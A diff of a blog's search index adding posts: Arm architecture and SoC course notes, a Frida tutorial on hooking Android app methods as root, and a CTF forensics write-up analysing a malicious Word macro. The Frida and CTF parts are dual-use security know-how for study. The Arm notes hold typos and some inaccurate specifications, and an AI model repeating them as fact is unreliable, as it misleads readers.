+<p><strong>A-profile (Application profile)</strong> is used in high-performance applications such as smartphones, tablets, and laptops. It includes features like:</p>
+<ul>
+<li>Support for virtual memory</li>
+<li>Support for multiple cores</li>
+<li>Support for SIMD (Single Instruction, Multiple Data) instructions</li>
+</ul>
+<p>Mostly targets running a full OS such as Linux</p>
+<ul>
+<li><strong>Implementation</strong>: Cortex-A, Cortex-X and Neoverse</li>
+<li><strong>Latest Version</strong>: Armv9-A and Armv8-A</li>
+</ul>
+<p><strong>R-Profile (Real-time profile)</strong> is used in real-time applications such as automotive and industrial control systems. It includes features like:</p>
+<ul>
+<li>Low-latency interrupt handling</li>
+<li>Deterministic execution</li>
+</ul>
+<p>Targets embedded systems with real-time requirements</p>
+<ul>
+<li><strong>Implementation</strong>: Cortex-R</li>
+<li><strong>Latest Version</strong>: Armv8-R</li>
+</ul>
+<p><strong>M-profile (Microcontroller profile)</strong> is used in microcontrollers and embedded systems. It includes features like:</p>
+<ul>
+<li><p>Low power consumption</p>
+</li>
+<li><p>Small code size</p>
+</li>
+<li><p><strong>Implementation</strong>: Cortex-M</p>
+</li>
+<li><p><strong>Latest Version</strong>: Armv8-M</p>
+</li>
+</ul>
+<h4 id="Execution-States"><a href="#Execution-States" class="headerlink" title="Execution States"></a>Execution States</h4><p><strong>AArch32</strong>: AArch32 is the 32-bit execution state of the ARM architecture. It supports both ARM and Thumb instruction sets and is used in a wide range of applications, from embedded systems to mobile devices. Supports T32 and A32 instruction sets.</p>
+<p><strong>AArch64</strong>: AArch64 is the 64-bit execution state of the ARM architecture. It supports a new instruction set and is designed for high-performance applications, such as servers and desktops. It is also used in mobile devices that require more memory and processing power. Supports A64 instruction set.</p>
+<p><strong>Big.LITTLE</strong>: Big.LITTLE is a heterogeneous computing architecture that combines high-performance cores (big) with power-efficient cores (LITTLE) in a single system-on-chip (SoC). This allows the system to dynamically switch between cores based on workload requirements, optimizing performance and power consumption.</p>
+<h4 id="R-Profile-Architecture"><a href="#R-Profile-Architecture" class="headerlink" title="R-Profile Architecture"></a>R-Profile Architecture</h4><ul>
+<li>No overlapping memory regions</li>
+<li>New exception model compatible with the Armv8-A model</li>
+<li>Virtualization support</li>
+<li>Memory management unit (MMU) support</li>
+</ul>
+<p><strong>Cortex-R Processors</strong>: Cortex-R82 with memory management unit (MMU) support for OS like Linux</p>
+<h4 id="M-Profile-Architecture"><a href="#M-Profile-Architecture" class="headerlink" title="M-Profile Architecture"></a>M-Profile Architecture</h4><p>Low-latency, highly deterministic operation</p>
+<ul>
+<li><strong>Armv8-M Baseline</strong>: Introduced the Armv8-M architecture, which includes support for the Armv8-M Security Extension (TrustZone) and the Armv8-M Mainline profile.</li>
+<li><strong>Armv8-M Mainline</strong>: Introduced the Armv8-M Mainline profile, which includes support for the Armv8-M Security Extension (TrustZone) and the Armv8-M Baseline profile.</li>
+</ul>
+<h4 id="AMBA"><a href="#AMBA" class="headerlink" title="AMBA"></a>AMBA</h4><p>The Advanced Microcontroller Bus Architecture (AMBA) is an open standard on-chip interconnect specification for the connection and management of functional blocks in SoC designs.</p>
+<p>AMBA is used to connect different components of a system-on-chip (SoC) design, such as processors, memory, and peripherals. It provides a standard interface for communication between these components, allowing for easier integration and interoperability.</p>
+<p><strong>Why use AMBA?</strong></p>
+<ul>
+<li><strong>Efficient IP reuse</strong>: IP reuse is an essential part of SoC design, and AMBA provides a standard interface for communication between different components, allowing for easier integration and interoperability.</li>
+<li><strong>Flexibility</strong>: AMBA provides a flexible and scalable architecture that can be used to connect different components of a system-on-chip (SoC) design, allowing for easier integration and interoperability.</li>
+<li><strong>Compatibility</strong>: AMBA is a widely used standard in the industry, and many IP cores are designed to be compatible with it, making it easier to integrate different components into a system-on-chip (SoC) design.</li>
+</ul>
+<h3 id="Security-in-Cortex-A"><a href="#Security-in-Cortex-A" class="headerlink" title="Security in Cortex-A"></a>Security in Cortex-A</h3><p>Cortex-A processors are designed with security features to protect against various threats, including malware and unauthorized access. These features include:</p>
+<ul>
+<li><strong>TrustZone</strong>: A hardware-based security extension that creates a secure execution environment for sensitive applications, allowing them to run in isolation from the rest of the system.</li>
+<li><strong>Memory Protection Unit (MPU)</strong>: A hardware component that enforces memory access permissions, preventing unauthorized access to sensitive data.</li>
+<li><strong>Secure Boot</strong>: A process that ensures only trusted software is loaded during the boot process, preventing malicious code from executing.</li>
+<li><strong>Cryptographic Acceleration</strong>: Hardware support for cryptographic operations, such as encryption and decryption, to enhance security and performance.</li>
+</ul>
+<h4 id="Armv9-A-Architecture-for-a-Rich-Secure-IoT-Ecosystem"><a href="#Armv9-A-Architecture-for-a-Rich-Secure-IoT-Ecosystem" class="headerlink" title="Armv9-A Architecture for a Rich Secure IoT Ecosystem"></a>Armv9-A Architecture for a Rich Secure IoT Ecosystem</h4><ul>
+<li><strong>Memory tagging</strong>: Support for memory tagging to enhance security and prevent memory-related attacks.</li>
+<li><strong>Secure-EL2</strong>: A secure exception level that provides an isolated environment for sensitive operations.</li>
+<li><strong>uArch side-band protection</strong>: Hardware-based protection mechanisms to secure microarchitecture elements.</li>
+<li><strong>Crypto support</strong>: Enhanced hardware support for cryptographic operations.</li>
+<li><strong>Branch target identifiers</strong>: Mechanisms to protect against branch target injection attacks.</li>
+<li><strong>Pointer authentication</strong>: Techniques to verify the authenticity of pointers and prevent unauthorized access.</li>
+</ul>
+<h4 id="Cortex-ISA-Progression-for-ML"><a href="#Cortex-ISA-Progression-for-ML" class="headerlink" title="Cortex ISA Progression for ML"></a>Cortex ISA Progression for ML</h4><ul>
+<li><strong>Armv7-A NEON</strong> including: 32x64bit register (Cortex-A7)</li>
+<li><strong>Armv8.0-A NEON</strong> including AArch32 and AArch64 (Cortex-A53)</li>
+<li><strong>Armv8.2-A NEON</strong> including: FP16 support (Cortex-A55)</li>
+<li><strong>Armv9.2-A SVE2</strong> including BF16 support (Cortex-A520)</li>
+</ul>
+<h4 id="SVE2-SIMD-Architecture-for-Next-Decade-of-Devices"><a href="#SVE2-SIMD-Architecture-for-Next-Decade-of-Devices" class="headerlink" title="SVE2: SIMD Architecture for Next Decade of Devices"></a>SVE2: SIMD Architecture for Next Decade of Devices</h4><ul>
+<li><strong>Better Developer experience</strong>: SVE2 provides a more flexible and efficient programming model for developers, allowing them to write code that can take advantage of the latest hardware features.</li>
+<li><strong>Better Auto-Vectorization</strong>: SVE2 provides better support for auto-vectorization, allowing compilers to generate more efficient code for SIMD operations.</li>
+</ul>
+<h4 id="Scalable-Matrix-Extension-SME"><a href="#Scalable-Matrix-Extension-SME" class="headerlink" title="Scalable Matrix Extension (SME)"></a>Scalable Matrix Extension (SME)</h4><p>SME2 execution unit in CPU cluster</p>
+<ul>
+<li>Matrix outer product</li>
+<li>Shared between all the CPUs</li>
+<li>All CPUs have access to the engine</li>
+<li>Transparent to OS</li>
+</ul>
+<p><em>(Resource from ARM Scalable Matrix Extension SME introduction)</em></p>
+<h4 id="Benefits-of-SME2-in-CPU"><a href="#Benefits-of-SME2-in-CPU" class="headerlink" title="Benefits of SME2 in CPU"></a>Benefits of SME2 in CPU</h4><ul>
+<li><strong>Performance</strong>: SME2 provides a significant performance boost for matrix operations, which are commonly used in machine learning and AI applications.</li>
+<li><strong>Flexibility &amp; Future-Proof</strong>: SME2 is designed to be flexible and future-proof, allowing it to adapt to new workloads and use cases as they emerge.</li>
+<li><strong>Developer Efficiency</strong>: SME2 provides tools and features that enhance developer productivity, making it easier to write and optimize code for matrix operations.</li>
+<li><strong>Security</strong>: SME2 includes security features to protect against potential threats and vulnerabilities, ensuring the integrity and confidentiality of data processed by the engine.</li>
+</ul>
+<h4 id="Software-Stack"><a href="#Software-Stack" class="headerlink" title="Software Stack"></a>Software Stack</h4><p>Cortex-A software stack for Hayas composed of:</p>
+<ul>
+<li><strong>ML</strong>: TFL runtime ONNX, TVM, ArmNN, ACL</li>
+<li><strong>Computer Vision</strong>: OpenCV, ACL</li>
+<li><strong>Security</strong>: TF-A, OP-TEE, Secure Partition Manager</li>
+</ul>
+<h4 id="Arm-Kleidi-Libraries"><a href="#Arm-Kleidi-Libraries" class="headerlink" title="Arm Kleidi Libraries"></a>Arm Kleidi Libraries</h4><ul>
+<li>Arm Kleidi AI</li>
+<li>Arm Kleidi CV</li>
+</ul>
+<p><em>&#x2F;&#x2F;write more about Arm Kleidi AI and CV</em></p>
+<h3 id="Cortex-R-Benefits"><a href="#Cortex-R-Benefits" class="headerlink" title="Cortex-R Benefits"></a>Cortex-R Benefits</h3><p>Cortex-R processors are designed for real-time applications, providing low-latency and deterministic performance. They are used in applications such as automotive, industrial control systems, and medical devices.</p>
+<h4 id="Key-Benefits"><a href="#Key-Benefits" class="headerlink" title="Key Benefits"></a>Key Benefits</h4><ul>
+<li><strong>Fast and deterministic response times</strong>: Cortex-R processors are designed to provide fast and deterministic response times, making them ideal for real-time applications.</li>
+<li><strong>Real-time performance</strong>: Tightly coupled memory, low latency peripheral ports, and a low-latency interrupt controller.</li>
+<li><strong>High reliability and fault tolerance</strong>: Cortex-R processors are designed to be highly reliable and fault-tolerant, making them ideal for applications that require high reliability and fault tolerance.</li>
+</ul>
+<h4 id="Applications-of-Cortex-R-Processors"><a href="#Applications-of-Cortex-R-Processors" class="headerlink" title="Applications of Cortex-R Processors"></a>Applications of Cortex-R Processors</h4><ul>
+<li><strong>Automotive</strong>: Cortex-R processors are used in automotive applications such as advanced driver assistance systems (ADAS), electronic stability control (ESC), and anti-lock braking systems (ABS).</li>
+<li><strong>Industrial control systems</strong>: Cortex-R processors are used in industrial control systems such as robotics, factory automation, and process control.</li>
+<li><strong>Medical devices</strong>: Cortex-R processors are used in medical devices such as patient monitoring systems, infusion pumps, and imaging systems.</li>
+<li><strong>Other applications</strong>: Automotive, modem, storage, healthcare, industrial control systems, and more.</li>
+</ul>
+<p>The latest <strong>Cortex-R82AE</strong> features 64-bit architecture with enhanced functional safety capabilities, virtual memory management, full system coherency, and native 64-bit instruction execution support.</p>
+<p><strong>Note</strong>: Cortex-A MMU is required for HLOS e.g. Linux&#x2F;Android while Cortex-R typically runs on RTOS like FreeRTOS, Zephyr, and others.</p>
+<h4 id="Functional-Safety"><a href="#Functional-Safety" class="headerlink" title="Functional Safety"></a>Functional Safety</h4><ul>
+<li>Systematic Errors Protection</li>
+<li>Integrated Safety Mechanisms</li>
+<li>Fault Detection and Recovery</li>
+</ul>
+<h3 id="Cortex-M"><a href="#Cortex-M" class="headerlink" title="Cortex-M"></a>Cortex-M</h3><p>Cortex-M is the most units shipped in the world, with over 200 billion units shipped since its introduction in 2004. It is used in a wide range of applications, including consumer electronics, automotive, industrial control systems, and medical devices.</p>
+<p>Cortex-M processors are designed for low-power, low-cost applications, providing a balance between performance and power efficiency. They are used in applications such as IoT devices, wearables, and smart home devices.</p>
+<h4 id="Applications-of-Cortex-M-Processors"><a href="#Applications-of-Cortex-M-Processors" class="headerlink" title="Applications of Cortex-M Processors"></a>Applications of Cortex-M Processors</h4><ul>
+<li>Energy grid, automotive, consumer electronics, industrial control systems, healthcare, retail, smart city, VR&#x2F;AR, connected clothing and more.</li>
+</ul>
+<h4 id="Factors-to-Choose-Suitable-Cortex-M"><a href="#Factors-to-Choose-Suitable-Cortex-M" class="headerlink" title="Factors to Choose Suitable Cortex-M"></a>Factors to Choose Suitable Cortex-M</h4><p>When selecting the appropriate Cortex-M processor for your application, consider these key factors:</p>
+<ul>
+<li><strong>Cost&#x2F;Die Area</strong>: Smaller die size reduces manufacturing costs, making it ideal for high-volume consumer products</li>
+<li><strong>Low Power</strong>: Ultra-low power consumption extends battery life for IoT devices and wearables</li>
+<li><strong>DSP Capabilities</strong>: Built-in digital signal processing features for audio, sensor data, and control algorithms</li>
+<li><strong>Security</strong>: Hardware security features like TrustZone-M for secure boot and data protection</li>
+<li><strong>Performance</strong>: Processing speed and efficiency for real-time applications and responsiveness</li>
+<li><strong>ML Support</strong>: Machine learning acceleration for edge AI applications and intelligent sensing</li>
+</ul>
+<h4 id="Arm-Helium"><a href="#Arm-Helium" class="headerlink" title="Arm Helium"></a>Arm Helium</h4><p><a class="link"   href="https://arm.com/resource/ebook/helium-mve-reference-book" >arm.com&#x2F;resource&#x2F;ebook&#x2F;helium-mve-reference-book<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<ul>
+<li>In DSP&#x2F;ML performance</li>
+<li>x2 datapath increase</li>
+<li>Achieve a x4 uplift in DSP&#x2F;ML performance</li>
+</ul>
+<h4 id="Open-Source-Libraries-Supporting-Helium"><a href="#Open-Source-Libraries-Supporting-Helium" class="headerlink" title="Open Source Libraries Supporting Helium"></a>Open Source Libraries Supporting Helium</h4><ul>
+<li><strong>CMSIS-DSP</strong>: CMSIS-DSP is a library of DSP functions optimized for Cortex-M processors, providing efficient implementations of common DSP algorithms.</li>
+<li><strong>CMSIS-Stream and CMSIS-NN</strong>: CMSIS-Stream and CMSIS-NN are libraries for machine learning and neural network applications on Cortex-M processors, providing optimized implementations of common ML algorithms.</li>
+<li><strong>Arm-2D Graphics Library</strong>: The Arm-2D graphics library is a lightweight, high-performance graphics library for Cortex-M processors, providing efficient rendering of 2D graphics.</li>
+</ul>
+<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><ul>
+<li>Cortex-M spans the spectrum of embedded applications</li>
+<li>Drives up energy efficiency</li>
+<li>High performance</li>
+</ul>
+<h1 id="Day-2"><a href="#Day-2" class="headerlink" title="Day 2"></a>Day 2</h1><h2 id="SoC-Development-Flow"><a href="#SoC-Development-Flow" class="headerlink" title="SoC Development Flow"></a>SoC Development Flow</h2><p>Key Stages</p>
+<ul>
+<li>1 Architecture Definition &amp; Specification<ul>
+<li>Define the system requirements based on target applications (e.g., mobile, IoT, edge AI)</li>
+</ul>
+</li>
+<li>2 IP Selection and Integration<ul>
+<li>Select pre-verified RTL IP from providers like Arm (e.g., CPU, system interconnects, Corstone Subsystem)</li>
+<li>Integrate third-party IPs (e.g., security engines, wireless transceivers)</li>
+</ul>
+</li>
+<li>3 Frontend Design and Verification<ul>
+<li>Perform RTL design using Verilog&#x2F;SystemVerilog and desin sysnthesis for digital logic</li>
+</ul>
+</li>
+<li>4 Software Development( in Parallel)<ul>
+<li>Use virtua platforms (e.g. ARM FVPs) to enable early software development before hardware is ready.</li>
+<li>Develop and validate firmware, bloatloaders, devides drivers, and applications software.</li>
+</ul>
+</li>
+<li>5 Backend Implementation<ul>
+<li>Complete logi synthesis to convert RTL into gate-level netlist</li>
+<li>Perform place and route to create physical layout</li>
+<li>Run DFM (design for Manufactueabilty) checks</li>
+</ul>
+</li>
+<li>6 Tape-out and Fabrication<ul>
+<li>Generate the final GDSII (GDSII) file layout file and deliver it to the semiconductor foundary</li>
+</ul>
+</li>
+<li>7 Validation and bring up<ul>
+<li>Use evaluation board or FPGA prototypes for post-silicon validation</li>
+</ul>
+</li>
+<li>8 Mass Production and Deployment<ul>
+<li>Manufacture the SoC at scale and deploy it in target devices</li>
+</ul>
+</li>
+</ul>
+<h2 id="Key-Components-of-Arm-Based-SoC"><a href="#Key-Components-of-Arm-Based-SoC" class="headerlink" title="Key Components of Arm-Based SoC"></a>Key Components of Arm-Based SoC</h2><h3 id="1-ARM-Cpu-Cores"><a href="#1-ARM-Cpu-Cores" class="headerlink" title="1 ARM Cpu Cores"></a>1 ARM Cpu Cores</h3><ul>
+<li>** Cortes-A**: High-performance application processors for smartphones, tablets, and laptops.</li>
+<li><strong>Cortex-R</strong>: Real-time processors for automotive, industrial control, and medical devices</li>
+<li><strong>Cortex-M</strong>: Low-power microcontrollers for IoT, wearables, and</li>
+</ul>
+<h3 id="Memory-Subsystem"><a href="#Memory-Subsystem" class="headerlink" title="Memory Subsystem"></a>Memory Subsystem</h3><ul>
+<li><strong>L1&#x2F;L2&#x2F;L3 Cache</strong>: On-chip caches for fast access to frequently used data, TCM (tightly Coupled Memory)</li>
+<li><strong>DDR Memory Controller</strong>: Interface to external DRAM memory (e.g., LPDDR4, DDR5)</li>
+<li>On-chip SDRAM and ROM with support for external DRAM and flash memory</li>
+</ul>
+<h3 id="AMBA-Interconnect-Fabric"><a href="#AMBA-Interconnect-Fabric" class="headerlink" title="AMBA Interconnect Fabric"></a>AMBA Interconnect Fabric</h3><ul>
+<li>Arm -based SoC use AMBA (Advanced Microcontroller Bus Architecture) protovols”:<ul>
+<li>AXI (Advanced eXtensible Interface): High-performance interconnect for connecting high-speed peripherals and memory</li>
+<li>AHB (Advanced High-performance Bus): Used for connecting lower-speed peripherals and memory</li>
+<li>APB (Advanced Peripheral Bus): Low-power bus for connecting low-speed peripherals</li>
+</ul>
+</li>
+</ul>
+<h3 id="ARM-System-IP-and-CCorstone-Subsystem"><a href="#ARM-System-IP-and-CCorstone-Subsystem" class="headerlink" title="ARM System IP and CCorstone Subsystem"></a>ARM System IP and CCorstone Subsystem</h3><p>Include essential Arm System IP<br>    - NIC-400&#x2F;NIC-450 (Interconnect)<br>    - MMU&#x2F;MOU, DMA controllers, timer and power management blocks</p>
+<h3 id="Peripherals-and-I-O-Interfaces"><a href="#Peripherals-and-I-O-Interfaces" class="headerlink" title="Peripherals and I&#x2F;O Interfaces"></a>Peripherals and I&#x2F;O Interfaces</h3><ul>
+<li>Standard communication interfaces: UART, SPI, I2C, CAN , USB, Ethernet</li>
+<li>general purpose I&#x2F;Os (GPIOs), Timers, ADCs.DACs</li>
+<li>Interfaces for display camera or storages as needed (ed. mipi, sido)</li>
+</ul>
+<h3 id="AI-ML-and-Arithmetic-Hardware-Accelerators"><a href="#AI-ML-and-Arithmetic-Hardware-Accelerators" class="headerlink" title="AI&#x2F;ML and Arithmetic Hardware Accelerators"></a>AI&#x2F;ML and Arithmetic Hardware Accelerators</h3><ul>
+<li>Arm Ethos-N NPU for AI&#x2F;ML inference acceleration</li>
+<li>CCompatible with TensorFlow Lite for Microcontrollers, TVM and Vela compiler</li>
+</ul>
+<h3 id="Hardware-Security-Components"><a href="#Hardware-Security-Components" class="headerlink" title="Hardware Security Components"></a>Hardware Security Components</h3><ul>
+<li>Arm TrustZone for secure boot, secure storage, and trusted execution environment (TEE)</li>
+<li>Cryptographic accelerators for encryption&#x2F;decryption</li>
+<li>Secure debug and trace interfaces</li>
+</ul>
+<h3 id="Power-and-Clock-Managements"><a href="#Power-and-Clock-Managements" class="headerlink" title="Power and Clock Managements"></a>Power and Clock Managements</h3><ul>
+<li>Dynamic Voltage and Frequency Scaling (DVFS) for power efficiency</li>
+<li>Clock gating, power islands and PMU (power management unit) to extend battery life and reduce thermal load</li>
+</ul>
+<p>resource <a class="link"   href="https://www.arm.com/resources/education/academic-developer-platforms" >www.arm.com/resources/education.academic-developer-platform<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<h3 id="Arm-based-Development-Platforms"><a href="#Arm-based-Development-Platforms" class="headerlink" title="Arm-based Development Platforms"></a>Arm-based Development Platforms</h3><h4 id="AI-Software-Development"><a href="#AI-Software-Development" class="headerlink" title="AI Software Development"></a>AI Software Development</h4><p><strong>Cortex-M Platform:</strong></p>
+<ul>
+<li><strong>Himax Grove Vision AI v2</strong><ul>
+<li>Cortex-M55 + Ethos-U55</li>
+<li>Optimized for edge AI applications</li>
+</ul>
+</li>
+</ul>
+<p><strong>Cortex-A Platform:</strong></p>
+<ul>
+<li><strong>Raspberry Pi 4</strong><ul>
+<li>Cortex-A76 + PCIe Gen3</li>
+<li>High-performance computing for AI workloads</li>
+</ul>
+</li>
+</ul>
+<h4 id="IP-Validation"><a href="#IP-Validation" class="headerlink" title="IP Validation"></a>IP Validation</h4><p><strong>Cortex-M Platform:</strong></p>
+<ul>
+<li><strong>ARM MPS3 FPGA</strong><ul>
+<li>Cortex-M55 + Ethos-U55</li>
+<li>FPGA-based validation environment</li>
+</ul>
+</li>
+</ul>
+<p><strong>Cortex-A Platform:</strong></p>
+<ul>
+<li><strong>AMD Zynq MPSoC</strong><ul>
+<li>Cortex-A53 + FPGA</li>
+<li>Hybrid ARM + FPGA development platform</li>
+</ul>
+</li>
+</ul>
+<h4 id="SoC-Emulation"><a href="#SoC-Emulation" class="headerlink" title="SoC Emulation"></a>SoC Emulation</h4><p><strong>Hardware Emulation Platform:</strong></p>
+<ul>
+<li><strong>AMD VU19P</strong><ul>
+<li>SoC hardware emulation with real-world data</li>
+<li>Enterprise-grade emulation capabilities</li>
+</ul>
+</li>
+</ul>
+<p><em>Resource: <a class="link"   href="https://www.arm.com/resources/education/academic-developer-platforms" >www.arm.com/resources/education/academic-developer-platforms<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></em></p>
+<p>nanoSoc Silicom from SOC Labs<br>Fast-kNN<br>Academic Silicon cortex-M55 + ethos-U55 (tsmc n16)</p>
+<p>wiki.seedstudio.com&#x2F;grove_vision_ai_v2</p>
+<h3 id="Early-software-development-using-arm-virtual-hardware"><a href="#Early-software-development-using-arm-virtual-hardware" class="headerlink" title="Early software development using arm virtual hardware"></a>Early software development using arm virtual hardware</h3><p>Arm virtual hardware (AVH)<br>AVH fixed virtual platforms (FVPs)<br>AVH corellium models</p>
+<h2 id="Summary-1"><a href="#Summary-1" class="headerlink" title="Summary"></a>Summary</h2><ul>
+<li>Architecture Design and HW &amp; SW Partition<ul>
+<li>Hardware Virtual Modeling</li>
+<li>FPGA Prototyping</li>
+</ul>
+</li>
+<li>Hardware IP Design and SoC integration<ul>
+<li>Select IP Cores</li>
+<li>SoC Hardware Integration</li>
+<li>Functional Simulation</li>
+</ul>
+</li>
+<li>Software development<ul>
+<li>Develop Device drivers</li>
+<li>Build Linux OS Kernels</li>
+<li>Create applications software</li>
+</ul>
+</li>
+<li>Use cases<ul>
+<li>Functional Verification</li>
+<li>Boot code and OS Bring up</li>
+<li>Performance Analysis</li>
+</ul>
+</li>
+</ul>
+<h1 id="Day-3"><a href="#Day-3" class="headerlink" title="Day 3"></a>Day 3</h1>]]></content>
+  </entry>
+  <entry>
+    <title>APK Analysis Frida</title>
+    <url>/2025/06/04/APK-Analysis-Frida/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\node_modules\aplayer\dist\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\node_modules\aplayer\dist\Meting.min.js"></script><p>What is Frida?<br>Frida is a toolkit that enables dynamic interaction with running programs.</p>
+<h2 id="Installing-Frida"><a href="#Installing-Frida" class="headerlink" title="Installing Frida"></a>Installing Frida</h2><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pip install frida-tools</span><br></pre></td></tr></table></figure></div>
+<p>Then test the installation:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">frida --version</span><br></pre></td></tr></table></figure></div>
+<p>Next, match your device’s architecture (use adb shell getprop ro.product.cpu.abi)</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">adb shell getprop ro.product.cpu.abi</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Using-Frida-for-APK-Analysis"><a href="#Using-Frida-for-APK-Analysis" class="headerlink" title="Using Frida for APK Analysis"></a>Using Frida for APK Analysis</h2><ol>
+<li><strong>Connect your Android device</strong> via USB and ensure USB debugging is enabled.</li>
+<li><strong>Start the Frida server</strong> on your Android device: <div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">adb shell</span><br><span class="line">su</span><br><span class="line">frida-server &amp;</span><br></pre></td></tr></table></figure></div></li>
+<li><strong>List running processes</strong> to find your target app: <div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">frida-ps -U</span><br></pre></td></tr></table></figure></div></li>
+<li><strong>Attach to the target app</strong> using its process ID or name: <div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">frida -U -n &lt;app_name&gt;</span><br></pre></td></tr></table></figure></div></li>
+<li><strong>Inject scripts</strong> to manipulate or analyze the app: <div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">frida -U -l your_script.js -n &lt;app_name&gt;</span><br></pre></td></tr></table></figure></div></li>
+<li><strong>Use Frida’s REPL</strong> to interactively explore the app: <div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">    frida -U -n &lt;app_name&gt; -f &lt;app_name&gt; --no</span><br><span class="line">-pause</span><br></pre></td></tr></table></figure></div></li>
+<li><strong>Write custom scripts</strong> to hook functions, modify behavior, or extract data: <div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">MainActivity</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.example.app.MainActivity&#x27;</span>);</span><br><span class="line">    <span class="title class_">MainActivity</span>.<span class="property">someMethod</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;someMethod called&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">someMethod</span>();</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div></li>
+</ol>
+]]></content>
+  </entry>
+  <entry>
     <title>CyberX Internal CTF 2024</title>
     <url>/2024/12/31/CyberX-Internal-CTF-2024/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\node_modules\aplayer\dist\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\node_modules\aplayer\dist\Meting.min.js"></script><h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="Forensic-Odyssey-1-A-Message-in-the-Mist"><a href="#Forensic-Odyssey-1-A-Message-in-the-Mist" class="headerlink" title="Forensic Odyssey 1: A Message in the Mist"></a>Forensic Odyssey 1: A Message in the Mist</h2><hr>
@@ -1441,6 +1095,370 @@
       </tags>
   </entry>
   <entry>
+    <title>CSLU 2024 UPM</title>
+    <url>/2024/12/31/CSLU-2024-UPM/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\node_modules\aplayer\dist\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\node_modules\aplayer\dist\Meting.min.js"></script><h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="Dr-Mals"><a href="#Dr-Mals" class="headerlink" title="Dr. Mals"></a>Dr. Mals</h2><hr>
+<ol>
+<li>Download the Dr. Mals word file</li>
+<li>Use Oletools - olevba to decrypt this file<ul>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/f6c2bc3c-cc2f-40dc-a40b-8eaef09150cd"
+                      alt="image"
+                ></li>
+</ul>
+</li>
+<li>With the use of CyberChef, we can find out the encoded text<ul>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/927f7112-1acd-487a-8c57-a5a9fa5fa144"
+                      alt="image"
+                ></li>
+</ul>
+</li>
+<li>Searching the website and it given<ul>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/3f0cf691-eea1-45ce-9dd9-30e9442d1a79"
+                      alt="image"
+                ></li>
+</ul>
+</li>
+<li>Lets decode this<ul>
+<li>With the use of online decoderwe can find out the flag</li>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/62c1dd32-c3a9-4a8d-9f3b-3b331119dba8"
+                      alt="image"
+                ></li>
+</ul>
+</li>
+<li>Thats it.</li>
+</ol>
+<h4 id="Acknowledgement"><a href="#Acknowledgement" class="headerlink" title="Acknowledgement"></a>Acknowledgement</h4><p>Thx to Akram for providing Hint</p>
+<h2 id="RE-Memory-Delete"><a href="#RE-Memory-Delete" class="headerlink" title="RE:Memory Delete"></a>RE:Memory Delete</h2><hr>
+<ol>
+<li>First, we download the attached file given by the challenge.<ul>
+<li>Challenge.7z</li>
+</ul>
+</li>
+<li>Unzip it.<br>-Challenge.ad1 files inside.</li>
+<li>.ad1 is a image files so lets use FTK Imager to find the deleted file</li>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/98a6ce23-53b1-4a37-9a8c-9a9cae49e6f1"
+                      alt="image"
+                ></li>
+<li>There goes the flag</li>
+</ol>
+<h2 id="Skyfall"><a href="#Skyfall" class="headerlink" title="Skyfall"></a>Skyfall</h2><hr>
+<p><em>Pain killer, My Skill issue… XD</em></p>
+<ol>
+<li>Download the file attach by the challenge.<br>-capture.pcapng</li>
+<li>Use wireshark to open the pcapng files</li>
+<li>See the clue given, Love the EDITED LEWIS VERSION files and lost the flag.<ul>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/9ec25fe0-ecd3-4587-a4e7-5887377fbfbe"
+                      alt="image"
+                ></li>
+</ul>
+</li>
